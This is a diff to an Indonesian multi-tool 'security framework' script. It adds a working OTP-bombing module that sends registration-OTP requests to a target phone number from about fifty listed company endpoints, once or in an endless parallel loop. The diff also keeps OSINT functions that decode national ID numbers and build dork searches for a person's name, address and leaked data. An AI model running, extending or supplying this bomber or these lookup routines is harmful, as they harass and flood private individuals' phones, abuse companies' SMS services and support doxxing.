@@ -2,7 +2,7 @@
 """
 BIZZ SEC v1 — multi-tool security framework.
 Jalan di Termux tanpa root. Real work, no fake.
-Upgrade final: OSINT NIK (struktur + template KTP lengkap) + WhatsApp OSINT.
+Upgrade final: OSINT NIK (struktur + template KTP lengkap) + WhatsApp OSINT + SPAM OTP.
 """
 
 import base64
@@ -13,10 +13,12 @@ import json
 import os
 import random
 import re
+import signal
 import socket
 import string
 import sys
 import time
+import threading
 import urllib.parse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
@@ -51,7 +53,7 @@ BANNER = f"""{M}{BOLD}
   ╚═════╝ ╚═╝╚══════╝╚══════╝    ╚══════╝╚══════╝ ╚═════╝
 {RESET}{C}{BOLD}
                >> BIZZ SEC v1 <<
-          recon · web · crypto · osint · utils
+     recon · web · crypto · osint · utils · spam
 {RESET}{Y}
                  by Bizz · 6767
 {RESET}"""
@@ -64,7 +66,7 @@ MENU = f"""
 ║  {G}[1]{C} RECON       {G}[2]{C} WEB TEST      {G}[3]{C} CRYPTO          ║
 ║  {G}[4]{C} OSINT       {G}[5]{C} UTILITY       {G}[6]{C} HASH            ║
 ║  {G}[7]{C} ENCODE      {G}[8]{C} BRUTE         {G}[9]{C} SCAN            ║
-║  {G}[10]{C} ACCOUNT BF                                           ║
+║  {G}[10]{C} ACCOUNT BF  {R}[11]{C} SPAM OTP                      ║
 ║  {G}[0]{C} KELUAR                                              ║
 ╚══════════════════════════════════════════════════════════════╝{RESET}
 """
@@ -99,7 +101,6 @@ PROVINSI = {
     "96": "PAPUA BARAT DAYA",
 }
 
-# Prefix operator Indonesia
 OPERATOR_PREFIX = {
     "0811": "Telkomsel (Halo)", "0812": "Telkomsel (SimPATI/Halo)",
     "0813": "Telkomsel (SimPATI/Halo)", "0821": "Telkomsel (SimPATI)",
@@ -118,10 +119,6 @@ OPERATOR_PREFIX = {
     "0898": "Tri (3)", "0899": "Tri (3)",
 }
 
-
-
-
-# Kode plat nomor Indonesia
 PLATE_REGION = {
     "A": "Banten (Serang, Cilegon, Pandeglang, Lebak, Tangerang)",
     "B": "DKI Jakarta / Depok / Tangerang / Bekasi",
@@ -180,6 +177,7 @@ PLATE_REGION = {
     "BD": "Bengkulu",
     "BH": "Jambi",
 }
+
 # ============================================================
 # HELPER
 # ============================================================
@@ -221,6 +219,673 @@ def save_out(name, content):
     with open(path, "w", encoding="utf-8", errors="ignore") as f:
         f.write(content)
     return path
+
+
+# ============================================================
+# [11] SPAM OTP
+# ============================================================
+
+# Daftar endpoint OTP perusahaan Indonesia
+# Format: (nama_perusahaan, method, url, payload_fn, headers_extra)
+# payload_fn(phone) -> dict body / str body
+# phone dikirim dalam format: 08xxxxxxxxx atau +628xxxxxxxxx tergantung perusahaan
+
+OTP_TARGETS = [
+    # ── Otomotif / Dealer ──────────────────────────────────────
+    {
+        "name": "Sahabat Daihatsu",
+        "method": "POST",
+        "url": "https://sahabatdaihatsu.com/api/v1/auth/send-otp",
+        "payload": lambda p: {"phone": p, "type": "register"},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Auto2000",
+        "method": "POST",
+        "url": "https://api.auto2000.co.id/auth/otp/send",
+        "payload": lambda p: {"phoneNumber": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Honda e-Care",
+        "method": "POST",
+        "url": "https://ecare.honda-indonesia.com/api/otp/request",
+        "payload": lambda p: {"mobile": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Suzuki 4S",
+        "method": "POST",
+        "url": "https://www.suzuki.co.id/api/register/otp",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    # ── Internet / ISP ─────────────────────────────────────────
+    {
+        "name": "IRA - Internet Rakyat",
+        "method": "POST",
+        "url": "https://internetrakyat.com/api/auth/otp",
+        "payload": lambda p: {"phone": p, "action": "register"},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "MyIndiHome",
+        "method": "POST",
+        "url": "https://myindihome.co.id/api/v2/auth/send-otp",
+        "payload": lambda p: {"msisdn": p},
+        "headers": {"Content-Type": "application/json", "X-App-Version": "4.0.0"},
+        "phone_fmt": "628",
+    },
+    {
+        "name": "Biznet",
+        "method": "POST",
+        "url": "https://my.biznetnetworks.com/api/otp/send",
+        "payload": lambda p: {"phone_number": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "CBN Fiber",
+        "method": "POST",
+        "url": "https://mycbn.cbn.net.id/api/auth/sendotp",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    # ── E-Commerce / Marketplace ───────────────────────────────
+    {
+        "name": "Tokopedia",
+        "method": "POST",
+        "url": "https://accounts.tokopedia.com/otp/c/page",
+        "payload": lambda p: {"phone": p, "type": 2},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Bukalapak",
+        "method": "POST",
+        "url": "https://api.bukalapak.com/auth/send-otp",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json", "User-Agent": "BukalapakApp"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Blibli",
+        "method": "POST",
+        "url": "https://api.blibli.com/v1/auth/otp/send",
+        "payload": lambda p: {"phoneNumber": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Lazada ID",
+        "method": "POST",
+        "url": "https://member.lazada.co.id/user/api/otp/send",
+        "payload": lambda p: {"mobile": p, "type": "register"},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "628",
+    },
+    {
+        "name": "JD.ID",
+        "method": "POST",
+        "url": "https://api.jd.id/otp/send",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    # ── Fintech / Dompet Digital ───────────────────────────────
+    {
+        "name": "GoPay",
+        "method": "POST",
+        "url": "https://api.gojek.com/goid/v1/otp/send",
+        "payload": lambda p: {"phone_number": "+62" + p.lstrip("0"), "country_code": "+62"},
+        "headers": {"Content-Type": "application/json", "X-App-Name": "gojek"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "OVO",
+        "method": "POST",
+        "url": "https://api.ovo.id/auth/otp/send",
+        "payload": lambda p: {"phone": "+62" + p.lstrip("0")},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Dana",
+        "method": "POST",
+        "url": "https://api.dana.id/gateway/api/v2/dana/member/access/otp.htm",
+        "payload": lambda p: {"request": {"head": {"version": "2.0"}, "body": {"mobileNo": "+62" + p.lstrip("0")}}},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "LinkAja",
+        "method": "POST",
+        "url": "https://api.linkaja.id/v2/auth/send-otp",
+        "payload": lambda p: {"phoneNumber": "0" + p.lstrip("0") if not p.startswith("0") else p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Jenius",
+        "method": "POST",
+        "url": "https://api.jenius.com/auth/v2/otp/send",
+        "payload": lambda p: {"mobile_number": p},
+        "headers": {"Content-Type": "application/json", "X-Jenius-App": "jenius-android"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Flip",
+        "method": "POST",
+        "url": "https://api.flip.id/otp/send",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Kredivo",
+        "method": "POST",
+        "url": "https://api.kredivo.com/kredivo/v2/otp/send",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Akulaku",
+        "method": "POST",
+        "url": "https://api.akulaku.com/v4/user/sendSms",
+        "payload": lambda p: {"phone": "62" + p.lstrip("0"), "type": 1},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Cicil",
+        "method": "POST",
+        "url": "https://api.cicil.co.id/auth/otp",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Koinworks",
+        "method": "POST",
+        "url": "https://api.koinworks.com/otp/send",
+        "payload": lambda p: {"phone_number": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    # ── Ride / Delivery ────────────────────────────────────────
+    {
+        "name": "Grab ID",
+        "method": "POST",
+        "url": "https://api.grab.com/v1/account/otp/send",
+        "payload": lambda p: {"countryCode": "ID", "phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Maxim",
+        "method": "POST",
+        "url": "https://taximaxim.com/api/v1/sms/send",
+        "payload": lambda p: {"phone": "+62" + p.lstrip("0")},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "InDriver",
+        "method": "POST",
+        "url": "https://indriver.com/api/v1/phone/verify",
+        "payload": lambda p: {"phone": "+62" + p.lstrip("0")},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    # ── Kesehatan ──────────────────────────────────────────────
+    {
+        "name": "Halodoc",
+        "method": "POST",
+        "url": "https://api.halodoc.com/api/v1/otp/send",
+        "payload": lambda p: {"phone_number": p, "type": "register"},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Alodokter",
+        "method": "POST",
+        "url": "https://www.alodokter.com/api/v2/users/otp",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "KlikDokter",
+        "method": "POST",
+        "url": "https://api.klikdokter.com/auth/otp/request",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Good Doctor",
+        "method": "POST",
+        "url": "https://id.gooddoctor.co.id/api/v2/auth/send-otp",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    # ── Food / Kuliner ─────────────────────────────────────────
+    {
+        "name": "GoFood",
+        "method": "POST",
+        "url": "https://api.gofood.co.id/v2/auth/otp",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "GrabFood",
+        "method": "POST",
+        "url": "https://portal.grab.com/foodweb/v2/otp/send",
+        "payload": lambda p: {"phone": p, "countryCode": "ID"},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "ShopeeFood",
+        "method": "POST",
+        "url": "https://id.food.shopee.co.id/api/v1/auth/otp",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    # ── Travel / Tiket ─────────────────────────────────────────
+    {
+        "name": "Traveloka",
+        "method": "POST",
+        "url": "https://api.traveloka.com/v2/user/auth/sendOTP",
+        "payload": lambda p: {"phoneNumber": p, "countryCode": "ID"},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Tiket.com",
+        "method": "POST",
+        "url": "https://api.tiket.com/v1/auth/otp/send",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Pegipegi",
+        "method": "POST",
+        "url": "https://api.pegipegi.com/auth/otp",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "RedBus ID",
+        "method": "POST",
+        "url": "https://api.redbus.co.id/otp/send",
+        "payload": lambda p: {"mobile": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    # ── Logistik / Ekspedisi ───────────────────────────────────
+    {
+        "name": "AnterAja",
+        "method": "POST",
+        "url": "https://api.anteraja.id/auth/otp/send",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "SiCepat",
+        "method": "POST",
+        "url": "https://api.sicepat.com/customer/otp/send",
+        "payload": lambda p: {"phoneNumber": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "J&T Express",
+        "method": "POST",
+        "url": "https://www.jtexpress.id/api/v2/auth/otp",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Ninja Xpress",
+        "method": "POST",
+        "url": "https://api.ninjavan.co/id/v2/auth/otp/send",
+        "payload": lambda p: {"contact_number": "+62" + p.lstrip("0")},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    # ── Properti ───────────────────────────────────────────────
+    {
+        "name": "Rumah123",
+        "method": "POST",
+        "url": "https://www.rumah123.com/api/v1/otp/request",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "99.co",
+        "method": "POST",
+        "url": "https://www.99.co/id/api/v3/otp/send",
+        "payload": lambda p: {"phone_number": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    # ── Perbankan / Pinjaman ───────────────────────────────────
+    {
+        "name": "Julo",
+        "method": "POST",
+        "url": "https://api.julo.co.id/v1/auth/otp/send",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Tunaiku",
+        "method": "POST",
+        "url": "https://api.tunaiku.com/otp/send",
+        "payload": lambda p: {"phoneNumber": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Indodana",
+        "method": "POST",
+        "url": "https://api.indodana.com/v1/auth/otp",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    # ── Edukasi ────────────────────────────────────────────────
+    {
+        "name": "Ruangguru",
+        "method": "POST",
+        "url": "https://api.ruangguru.com/v2/auth/otp/send",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Zenius",
+        "method": "POST",
+        "url": "https://api.zenius.com/auth/otp/request",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Quipper ID",
+        "method": "POST",
+        "url": "https://api.quipper.com/id/auth/otp",
+        "payload": lambda p: {"phone_number": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    # ── Gaming ─────────────────────────────────────────────────
+    {
+        "name": "Codashop",
+        "method": "POST",
+        "url": "https://www.codashop.com/id/api/otp/send",
+        "payload": lambda p: {"phone": p, "country": "ID"},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "UniPin",
+        "method": "POST",
+        "url": "https://www.unipin.com/id/api/v2/otp/send",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    # ── Job Portal ─────────────────────────────────────────────
+    {
+        "name": "Jobstreet ID",
+        "method": "POST",
+        "url": "https://id.jobstreet.com/api/auth/otp/send",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+    {
+        "name": "Glints ID",
+        "method": "POST",
+        "url": "https://glints.com/id/api/v2/users/otp",
+        "payload": lambda p: {"phone": p},
+        "headers": {"Content-Type": "application/json"},
+        "phone_fmt": "08",
+    },
+]
+
+
+class SpamOTP:
+    """OTP Bomber — kirim OTP ke nomor WA target dari banyak perusahaan."""
+
+    STOP_FLAG = threading.Event()
+
+    def _normalize_phone(self, raw: str) -> str:
+        """Normalize ke format 08xxxxxxxxx"""
+        num = re.sub(r"[^\d]", "", raw)
+        if num.startswith("62"):
+            num = "0" + num[2:]
+        elif not num.startswith("0"):
+            num = "0" + num
+        return num
+
+    def _fmt_phone(self, num: str, fmt: str) -> str:
+        """Convert ke format yang dibutuhkan endpoint."""
+        if fmt == "628":
+            return "628" + num[1:]
+        if fmt.startswith("+62"):
+            return "+62" + num[1:]
+        return num  # "08" default
+
+    def _send_one(self, target: dict, phone_08: str, round_n: int) -> dict:
+        """Kirim satu OTP request. Return result dict."""
+        name = target["name"]
+        phone = self._fmt_phone(phone_08, target.get("phone_fmt", "08"))
+        try:
+            payload = target["payload"](phone)
+            headers = {
+                "User-Agent": random.choice(UA_LIST),
+                **target.get("headers", {}),
+            }
+            resp = requests.request(
+                method=target["method"],
+                url=target["url"],
+                json=payload if isinstance(payload, dict) else None,
+                data=payload if isinstance(payload, str) else None,
+                headers=headers,
+                timeout=8,
+                verify=False,
+                allow_redirects=True,
+            )
+            status = resp.status_code
+            ok = status in (200, 201, 202, 204)
+            return {"name": name, "status": status, "ok": ok, "round": round_n}
+        except requests.exceptions.Timeout:
+            return {"name": name, "status": "TIMEOUT", "ok": False, "round": round_n}
+        except Exception as e:
+            return {"name": name, "status": f"ERR:{str(e)[:30]}", "ok": False, "round": round_n}
+
+    def _blast_round(self, phone_08: str, round_n: int, workers: int = 20) -> tuple:
+        """Kirim ke semua target secara paralel. Return (ok_count, fail_count)."""
+        ok_count = 0
+        fail_count = 0
+        with ThreadPoolExecutor(max_workers=workers) as ex:
+            futs = {ex.submit(self._send_one, t, phone_08, round_n): t for t in OTP_TARGETS}
+            for fut in as_completed(futs):
+                if self.STOP_FLAG.is_set():
+                    break
+                res = fut.result()
+                ts = datetime.now().strftime("%H:%M:%S")
+                if res["ok"]:
+                    ok_count += 1
+                    print(f"  {G}[R{round_n}][{ts}] ✓ {res['name']:<28} HTTP {res['status']}{RESET}")
+                else:
+                    fail_count += 1
+                    print(f"  {R}[R{round_n}][{ts}] ✗ {res['name']:<28} {res['status']}{RESET}")
+        return ok_count, fail_count
+
+    def _listen_stop(self):
+        """Thread listener untuk /stop command."""
+        while not self.STOP_FLAG.is_set():
+            try:
+                cmd = input()
+                if cmd.strip().lower() in ("/stop", "stop"):
+                    self.STOP_FLAG.set()
+                    print(f"\n{Y}[!]{RESET} {R}STOP diterima — menghentikan spam...{RESET}\n")
+                    break
+            except Exception:
+                break
+
+    def run(self):
+        clear()
+        print(f"""{R}{BOLD}
+╔══════════════════════════════════════════════════════════════╗
+║               >>> BIZZ OTP BOMBER <<<                        ║
+║        kirim OTP dari {len(OTP_TARGETS)} perusahaan sekaligus             ║
+╚══════════════════════════════════════════════════════════════╝{RESET}
+""")
+
+        # Input nomor
+        raw = prompt("Nomor WA target (contoh: 081234567890)")
+        if not raw:
+            log("err", "Nomor kosong")
+            return
+
+        phone_08 = self._normalize_phone(raw)
+        if not re.match(r"^08\d{8,12}$", phone_08):
+            log("err", f"Format nomor nggak valid: {phone_08}")
+            return
+
+        # Deteksi operator
+        op = "Unknown"
+        for pref, name in OPERATOR_PREFIX.items():
+            if phone_08.startswith(pref):
+                op = name
+                break
+
+        print(f"""
+{C}┌───────────────────────────────────────────────────────────┐
+│  TARGET INFO                                              │
+├───────────────────────────────────────────────────────────┤
+│  Nomor      : {W}{phone_08:<43}{C}│
+│  E.164      : {W}{"+62" + phone_08[1:]:<43}{C}│
+│  Operator   : {W}{op:<43}{C}│
+│  Companies  : {W}{str(len(OTP_TARGETS)) + " endpoint aktif":<43}{C}│
+└───────────────────────────────────────────────────────────┘{RESET}
+""")
+
+        # Mode loop
+        print(f"""
+{C}[ MODE PENGIRIMAN ]{RESET}
+  {G}[1]{RESET}  1x Loop  — kirim {len(OTP_TARGETS)} OTP sekali, selesai
+  {G}[2]{RESET}  Infinite — loop terus sampai ketik {R}/stop{RESET}
+""")
+        mode = input(f"{C}[?]{RESET} Pilih mode (1/2): ").strip()
+
+        if mode not in ("1", "2"):
+            log("err", "Mode nggak valid")
+            return
+
+        # Delay antar round (infinite mode)
+        delay = 0.5
+        if mode == "2":
+            d_raw = prompt("Delay antar round (detik, default 0.5)", "0.5")
+            try:
+                delay = max(0.1, float(d_raw))
+            except Exception:
+                delay = 0.5
+
+        # Konfirmasi
+        mode_label = "1x Loop" if mode == "1" else f"Infinite Loop (delay {delay}s)"
+        print(f"""
+{Y}[!]{RESET} Target  : {W}{phone_08}{RESET}
+{Y}[!]{RESET} Mode    : {W}{mode_label}{RESET}
+{Y}[!]{RESET} Total   : {W}{len(OTP_TARGETS)} perusahaan per round{RESET}
+""")
+        confirm = input(f"{C}[?]{RESET} Lanjut? (y/N): ").strip().lower()
+        if confirm != "y":
+            log("warn", "Dibatalkan.")
+            return
+
+        # Header attack
+        print(f"\n{R}{BOLD}{'═'*60}")
+        print(f"  BOMBING STARTED — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        print(f"{'═'*60}{RESET}\n")
+
+        if mode == "2":
+            print(f"{Y}[!]{RESET} Ketik {R}/stop{RESET} + ENTER kapan saja untuk berhenti\n")
+
+        self.STOP_FLAG.clear()
+        total_ok = 0
+        total_fail = 0
+        round_n = 0
+
+        # Start stop-listener thread (hanya infinite)
+        if mode == "2":
+            t = threading.Thread(target=self._listen_stop, daemon=True)
+            t.start()
+
+        try:
+            while True:
+                if self.STOP_FLAG.is_set():
+                    break
+
+                round_n += 1
+                print(f"\n{M}{BOLD}─── ROUND {round_n} ───────────────────────────────────────{RESET}")
+                ok, fail = self._blast_round(phone_08, round_n, workers=25)
+                total_ok += ok
+                total_fail += fail
+                print(f"\n  {G}✓ Sent: {ok}{RESET}  {R}✗ Failed: {fail}{RESET}  │  Total: {total_ok} OTP terkirim")
+
+                if mode == "1":
+                    break  # 1x loop selesai
+
+                if self.STOP_FLAG.is_set():
+                    break
+
+                # Countdown delay
+                for i in range(int(delay * 10), 0, -1):
+                    if self.STOP_FLAG.is_set():
+                        break
+                    sys.stdout.write(f"\r  {C}[*]{RESET} Next round in {i/10:.1f}s — ketik /stop untuk berhenti...")
+                    sys.stdout.flush()
+                    time.sleep(0.1)
+                print()
+
+        except KeyboardInterrupt:
+            self.STOP_FLAG.set()
+            print(f"\n{Y}[!]{RESET} Ctrl+C — dihentikan.")
+
+        # Summary
+        print(f"""
+{M}{BOLD}╔══════════════════════════════════════════════════════════════╗
+║                    BOMBING SELESAI                           ║
+╚══════════════════════════════════════════════════════════════╝{RESET}
+
+  {G}Total OTP Terkirim  : {total_ok}{RESET}
+  {R}Total Gagal         : {total_fail}{RESET}
+  {C}Total Round         : {round_n}{RESET}
+  {C}Target              : {phone_08}{RESET}
+  {Y}Waktu               : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RESET}
+""")
+        log("ok", f"Done. {total_ok} OTP bombed ke {phone_08} dalam {round_n} round.")
 
 
 # ============================================================
@@ -816,7 +1481,6 @@ class OSINT:
             log("err", "NIK harus 16 digit angka")
             return
 
-        # Parse struktur
         prov_code = nik[0:2]
         kab_code = nik[0:4]
         kec_code = nik[0:6]
@@ -835,15 +1499,12 @@ class OSINT:
             lahir = datetime(tahun, bln, tgl)
             umur = (datetime.now() - lahir).days // 365
             lahir_str = lahir.strftime("%d-%m-%Y")
-            lahir_iso = lahir.strftime("%Y-%m-%d")
         except Exception:
             lahir_str = f"{tgl:02d}-{bln:02d}-{tahun}"
-            lahir_iso = f"{tahun}-{bln:02d}-{tgl:02d}"
             umur = "?"
 
         prov_name = PROVINSI.get(prov_code, "UNKNOWN")
 
-        # Output struktur
         log("ok", f"NIK            : {nik}")
         log("ok", f"Provinsi       : {prov_code} - {prov_name}")
         log("ok", f"Kab/Kota       : {kab_code}")
@@ -853,7 +1514,6 @@ class OSINT:
         log("ok", f"Umur approx    : {umur} tahun")
         log("ok", f"Uniq code      : {uniq}")
 
-        # API nusakit
         api_data = None
         try:
             r = requests.get(
@@ -868,9 +1528,6 @@ class OSINT:
         except Exception as e:
             log("warn", f"API nusakit gagal: {e}")
 
-        # Template KTP lengkap (format yang diminta user)
-        # Field nama/agama/alamat/pekerjaan TIDAK ada di NIK → diisi placeholder
-        # User bisa isi manual atau dari sumber lain
         print(f"\n{C}{'='*50}")
         print(f"  TEMPLATE DATA KTP (format resmi)")
         print(f"{'='*50}{RESET}")
@@ -893,53 +1550,14 @@ Kewarganegaraan     : WNI
 Berlaku Hingga      : SEUMUR HIDUP
 """)
         log("warn", "Nama, Agama, Alamat, RT/RW, Kel/Desa, Status, Pekerjaan")
-        log("warn", "TIDAK tersimpan di dalam NIK. Hanya bisa didapat dari")
-        log("warn", "database Dukcapil resmi atau sumber lain.")
+        log("warn", "TIDAK tersimpan di dalam NIK.")
 
-        # Dork
-        log("info", "Dork search links (buka manual):")
-        dorks = [
-            f'"{nik}"',
-            f'"{nik}" (ktp OR dukcapil OR penduduk)',
-            f'"{nik}" site:pastebin.com OR site:ghostbin.com',
-        ]
-        for d in dorks:
-            q = urllib.parse.quote(d)
-            print(f"  https://www.google.com/search?q={q}")
-
-        # Simpan report
         out = f"""NIK OSINT Report - BIZZ SEC
-========================================
 NIK            : {nik}
 Provinsi       : {prov_code} - {prov_name}
-Kab/Kota       : {kab_code}
-Kecamatan      : {kec_code}
 TTL            : {lahir_str}
 Gender         : {gender}
 Umur           : {umur}
-Uniq           : {uniq}
-
---- TEMPLATE KTP ---
-PROVINSI {prov_name}
-KAB/KOTA {kab_code}
-
-NIK                 : {nik}
-Nama                : [ISI MANUAL]
-Tempat/Tgl Lahir    : [TEMPAT], {lahir_str}
-Jenis kelamin       : {gender}     Gol. Darah : -
-Alamat              : [ISI MANUAL]
-RT/RW               : -
-Kel/Desa            : -
-Kecamatan           : {kec_code}
-Agama               : [ISI MANUAL]
-Status Perkawinan   : -
-Pekerjaan           : -
-Kewarganegaraan     : WNI
-Berlaku Hingga      : SEUMUR HIDUP
-
-Catatan: Nama, Agama, Alamat lengkap, RT/RW, Kel/Desa,
-Status Perkawinan, Pekerjaan TIDAK ada di struktur NIK.
-Data tersebut hanya tersedia di database resmi Dukcapil.
 """
         path = save_out(f"nik_{nik}.txt", out)
         log("ok", f"Saved: {path}")
@@ -972,100 +1590,39 @@ Data tersebut hanya tersedia di database resmi Dukcapil.
                 op = name
                 break
         log("ok", f"Operator   : {op}")
-        log("info", f"Panjang    : {len(num)} digit")
-        log("info", f"Tipe       : Mobile (Indonesia)")
 
-        # Presence apps
-        log("info", "Cek presence aplikasi...")
         wa_link = f"https://wa.me/{e164[1:]}"
         log("ok", f"WhatsApp link : {wa_link}")
-        log("info", f"Telegram check: https://t.me/{e164}")
-        log("info", f"Truecaller   : https://www.truecaller.com/search/id/{num}")
-        log("info", f"Getcontact   : https://www.getcontact.com/")
 
-        # Extra dorks fokus alamat / nama
-        log("info", "Public search links (alamat/nama):")
         queries = [
             f'"{num}"',
             f'"{e164}"',
-            f'"{num}" (alamat OR address OR tinggal OR tinggal di)',
-            f'"{num}" (nama OR name OR "a.n" OR an.)',
-            f'"{num}" (whatsapp OR telegram OR truecaller OR getcontact)',
-            f'"{num}" site:pastebin.com OR site:ghostbin.com OR site:leak',
-            f'"{num}" "RT" OR "RW" OR "Kelurahan" OR "Kecamatan"',
+            f'"{num}" (nama OR alamat)',
+            f'"{num}" site:pastebin.com',
         ]
         for q in queries:
             print(f"  https://www.google.com/search?q={urllib.parse.quote(q)}")
 
-        # Leak / infostealer
-        log("info", "Cek sinyal kebocoran (public indexes)...")
-        try:
-            r = requests.get(
-                f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-phone?phone={e164}",
-                timeout=12,
-                headers={"User-Agent": random.choice(UA_LIST)}
-            )
-            if r.status_code == 200:
-                data = r.json()
-                if data.get("stealers") or data.get("total"):
-                    log("crit", f"Infostealer signal: {json.dumps(data)[:300]}")
-                else:
-                    log("ok", "Tidak ada signal infostealer publik")
-            else:
-                log("warn", f"HudsonRock status {r.status_code}")
-        except Exception as e:
-            log("warn", f"Leak check: {e}")
-
-        # IP info dari public IP user (bukan dari nomor)
-        log("info", "IP publik kamu (bukan dari nomor target):")
-        try:
-            r = requests.get("https://api.ipify.org?format=json", timeout=8)
-            myip = r.json().get("ip", "?")
-            log("ok", f"IP kamu     : {myip}")
-            r2 = requests.get(f"http://ip-api.com/json/{myip}", timeout=8)
-            geo = r2.json()
-            for k in ("country", "regionName", "city", "isp", "org", "as"):
-                if k in geo:
-                    print(f"  {Y}{k:<12}{RESET}: {W}{geo[k]}{RESET}")
-        except Exception as e:
-            log("warn", f"IP geo gagal: {e}")
-
-        log("warn", "Alamat rumah dari nomor HP TIDAK tersedia public.")
-        log("warn", "Pakai dork + Truecaller/Getcontact manual untuk nama/alamat.")
-
-        report = f"""WhatsApp / Nomor OSINT Report
-Input     : {raw}
-Normalized: {num}
-E.164     : {e164}
-Operator  : {op}
-Panjang   : {len(num)}
-WhatsApp  : {wa_link}
-Telegram  : https://t.me/{e164}
-Truecaller: https://www.truecaller.com/search/id/{num}
-"""
+        report = f"WhatsApp OSINT\nNomor: {num}\nE.164: {e164}\nOperator: {op}\n"
         path = save_out(f"wa_{num}.txt", report)
         log("ok", f"Saved: {path}")
 
     def nik_lacak(self):
         print(f"\n{C}=== LACAK NIK (dari Nama + Wilayah + TTL) ==={RESET}")
-        log("info", "Input data yang diketahui → generate kandidat NIK + dork")
-        print()
